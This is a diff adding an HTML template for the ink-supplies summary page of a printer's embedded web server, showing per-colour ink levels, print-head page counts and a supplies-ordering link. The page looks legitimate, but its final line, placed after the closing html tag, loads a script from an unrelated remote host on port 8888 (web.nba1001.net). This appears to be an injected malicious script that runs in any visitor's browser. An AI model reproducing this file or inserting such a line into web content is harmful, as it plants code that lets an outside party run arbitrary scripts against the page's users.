@@ -1,0 +1,171 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- 
+
+ supplies.html
+
+ Supplies Summary Page for the Toolbox Configuration Function
+
+ ************************************************************
+   (c) Copyright 2008-2010 Marvell International Ltd.      
+  
+                 Marvell Confidential
+ *===========================================================
+
+ This file is intended only for the uses agreed to. 
+
+ You are hereby notified that any dissemination, distribution or copying of 
+ this material accept for the purposes agreed to is strictly prohibited.
+
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title id="pageTitle" ><!--#ssi IDs STRING_EWS_SUPPLIES_SUMMARY --></title>
+
+<script type="text/javascript">
+<!--
+var pageNav = function(theURL) {
+
+    // open the next page, replacing the current page
+    window.open(theURL, "_self");
+    
+    return true;
+};
+
+// do special ordering link navigation
+var orderingNav = function(theURL) {
+
+    // open the supplies link
+    window.open(theURL);
+    
+};
+
+// Provided for any necessary left navigation initialization
+var initializeLeftNav = function(myDoc) {
+
+   // Developer may override this function for special client services functions
+
+};
+
+// Provided for any necessary page initialization
+var initializePage = function() {
+
+   initializeLeftNav(document);
+   
+}
+
+//-->
+</script>
+
+<script type="text/javascript" src="/js/client-tools.js"></script>
+
+<!--#cspi IDm TOOLBOX_JS_MACRO -->
+
+<style type="text/css">
+<!--#ssi INCLUDE /toolbox.css -->
+</style>
+
+</head>
+
+<body onload="initializePage()">
+
+
+    <!--#ssi INCLUDE /leftNav.html -->
+    
+    <div class="heading1" id="topOfPageRow">
+        <span id="deviceModelLabel"><!--#ssi IDr OID_PLATFORM_PRINT_NAME_STRING --></span> 
+    </div> <!-- end of div 'topOfPageRow'  -->
+
+    <div id="pageBodyDiv">
+    
+        <div class="heading1" id="topPageHeadingDiv">
+            <span id="currentPageLabel" ><!--#ssi IDs STRING_EWS_SUPPLIES_INFORMATION --></span>
+        </div> <!-- end of div 'topPageHeadingDiv'  -->
+        
+        <div class="heading2" id="topPageLabelsDiv">
+            <span id="pageInstructions" ><!--#ssi IDs STRING_EWS_SUPPLIES_VIEW_STATUS_NAV_LABEL --></span>
+        </div> <!-- end of div 'topPageLabelsDiv'  -->
+        
+        <div id="suppliesSelectDiv">
+            <div><span id="dropDownInstructions" ><!--#ssi IDs STRING_EWS_SUPPLIES_SELECT_PAGE --></span></div>
+            <div id="suppliesSelectControl">
+                <select onchange="javascript:pageNav(this.value);">
+                  <option selected value="/view/supplies/summary"><!--#ssi IDs STRING_EWS_SUPPLIES_SUMMARY_OPTION --></option>
+                  <option value="/view/supplies/printHead"><!--#ssi IDs STRING_EWS_PRINT_HEAD_OPTION --></option>
+                  <option value="/view/supplies/cyan"><!--#ssi IDs STRING_EWS_CYAN_DETAILS_OPTION --></option>
+                  <option value="/view/supplies/magenta"><!--#ssi IDs STRING_EWS_MAGENTA_DETAILS_OPTION --></option>
+                  <option value="/view/supplies/yellow"><!--#ssi IDs STRING_EWS_YELLOW_DETAILS_OPTION --></option>
+                  <option value="/view/supplies/black"><!--#ssi IDs STRING_EWS_BLACK_DETAILS_OPTION --></option>
+                </select>
+            </div>
+        </div> <!-- end of div 'suppliesSelectDiv'  -->
+        
+        
+        <div id="suppliesPageDialogDiv">
+
+            <div id="topPageHorizontalRule" >
+                <hr class="aRuleLine" />
+            </div>
+            
+            <div id="suppliesDialogTable">
+                
+                <!--<div id="suppliesLevelInfoDiv">
+                    <div class="levelImage"> <img id="cyanLevelGraphic" src="/images/supply-flag-<!--#ssi IDr OID_CONSUMABLE_TERNARY.COLOR_CYAN -->.gif" alt="supply level icon" /> </div>
+                    <div class="levelImage"> <img id="magentaLevelGraphic" src="/images/supply-flag-<!--#ssi IDr OID_CONSUMABLE_TERNARY.COLOR_MAGENTA -->.gif" alt="supply level icon" /> </div>
+                    <div class="levelImage"> <img id="yellowLevelGraphic" src="/images/supply-flag-<!--#ssi IDr OID_CONSUMABLE_TERNARY.COLOR_YELLOW -->.gif" alt="supply level icon" /> </div>
+                    <div class="levelImage"> <img id="blackLevelGraphic" src="/images/supply-flag-<!--#ssi IDr OID_CONSUMABLE_TERNARY.COLOR_BLACK -->.gif" alt="supply level icon" /> </div>
+                </div> <!-- end of div 'suppliesLevelInfoDiv'  -->
+
+                <div id="suppliesDialogGraphDiv">
+                    <div class="barGraph" id="Div227002"><span class="aMultiGraphBar" style="width: <!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_CYAN -->%;background: cyan"></span></div>
+                    <div class="barGraph" id="Div227004"><span class="aMultiGraphBar" style="width: <!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_MAGENTA -->%;background: magenta"></span></div>
+                    <div class="barGraph" id="Div227003"><span class="aMultiGraphBar" style="width: <!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_YELLOW -->%;background: yellow"></span></div>
+                    <div class="barGraph" id="Div227005"><span class="aMultiGraphBar" style="width: <!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_BLACK -->%;background: black"></span></div>
+                </div> <!-- end of div 'suppliesDialogGraphDiv'  -->
+                
+                <div id="markerDialogLabels">
+                    <div class="dialogRowB"><a class="suppliesNavLink" href="/view/supplies/printHead" ><!--#ssi IDs STRING_EWS_PRINT_HEAD_NAV_LABEL --></a></div>
+                    <div class="dialogRowB"><a class="suppliesNavLink" href="/view/supplies/cyan" ><!--#ssi IDs STRING_EWS_CYAN_MARKER_NAV_LABEL --></a></div>
+                    <div class="dialogRowB"><a class="suppliesNavLink" href="/view/supplies/magenta" ><!--#ssi IDs STRING_EWS_MAGENTA_MARKER_NAV_LABEL --></a></div>
+                    <div class="dialogRowB"><a class="suppliesNavLink" href="/view/supplies/yellow" ><!--#ssi IDs STRING_EWS_YELLOW_MARKER_NAV_LABEL --></a></div>
+                    <div class="dialogRowB"><a class="suppliesNavLink" href="/view/supplies/black" ><!--#ssi IDs STRING_EWS_BLACK_MARKER_NAV_LABEL --></a></div>
+                    
+                    <div class="dialogRowB"><span id="orderingLabel" ><!--#ssi IDs STRING_EWS_ORDER_SUPPLIES --></span> </div>
+                </div> <!-- end of div 'markerDialogLabels'  -->
+                
+                
+                <div id="markerDialogFields">
+                    <div class="dialogRowB"><span id="totalPages" ><!--#ssi IDr OID_PRINT_HEAD_TOTAL_PAGES_PRINTED --></span></div>
+                    <div class="dialogRowB"><span id="Text227002"><!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_CYAN --> %</span> </div>
+                    <div class="dialogRowB"><span id="Text227004"><!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_MAGENTA --> %</span> </div>
+                    <div class="dialogRowB"><span id="Text227003"><!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_YELLOW --> %</span> </div>
+                    <div class="dialogRowB"><span id="Text227005"><!--#ssi IDr OID_CONSUMABLE_PERCENT_REMAINING.COLOR_BLACK --> %</span> </div>
+                    
+                    <div class="dialogRowB"><a id="ordering" href="javascript:orderingNav('<!--#ssi IDr OID_HTTP_ORDER_SUPPLIES_LINK -->')" ><!--#ssi IDr OID_HTTP_ORDER_SUPPLIES_LINK --></a> </div>
+                
+                </div> <!-- end of div 'markerDialogFields'  -->
+            
+            </div> <!-- end of div 'suppliesDialogTable'  -->
+            
+            
+            <div id="allButtonsDiv">
+                <div id="bottomPageHorizontalRule" >
+                    <hr class="aRuleLine" />
+                </div>
+                <div id="errorMessageDiv">
+                    <span id="errorMessage" > &nbsp </span>
+                </div>
+                <div id="refreshButtonCell"> 
+                    <input class="button" type="submit" id="refreshButton" value="<!--#ssi IDs STRING_EWS_REFRESH_BUTTON_LABEL -->" onclick="javascript:pageNav('/view/supplies/summary');"/>
+                </div>
+            </div> <!-- end of div 'allButtonsDiv'  -->
+        
+        </div>  <!-- end of div 'suppliesPageDialogDiv'  -->
+    
+    </div> <!-- end of div 'pageBodyDiv'  -->
+
+
+
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
